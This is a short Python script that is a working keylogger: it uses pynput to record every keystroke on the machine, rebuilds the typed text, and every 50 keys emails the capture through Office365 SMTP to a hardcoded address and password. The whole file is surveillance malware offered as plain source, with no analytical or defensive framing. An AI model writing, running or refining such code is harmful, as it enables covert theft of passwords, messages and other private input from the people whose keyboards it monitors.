from pynput.keyboard import Key, Listener

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from datetime import datetime

key_count = 0
content = ""

def send_email():
    global content
    
    # Create message
    sender_password = "VeryRealPassword"
    sender_address = "ottercomp@outlook.com"

    message = MIMEMultipart()
    message["From"] = sender_address
    message["To"] = sender_address
    message["Subject"] = "Auto"

    message.attach(MIMEText(content, 'plain'))

    # Send an email
    session = smtplib.SMTP('smtp.office365.com', 587)
    session.starttls()
    session.login(sender_address, sender_password)
    session.sendmail(sender_address, sender_address, message.as_string())
    session.quit()

def delete_last_char():
    global content

    content = content[:-1]
        
def on_press(key):
    global key_count, content

    key_count += 1
    key_to_write=""
    if key == Key.space:
        key_to_write = " "
    elif key == Key.enter:
        key_to_write = "\n"
    elif key == Key.tab:
        key_to_write = "\t"
    elif key == Key.backspace:
        delete_last_char()
    else:
        key_to_write = key
    
    content += str(key_to_write).replace("'", "")

    if key_count >= 50:
        send_email()
        key_count = 0

with Listener(on_press=on_press) as listener:
    listener.join()
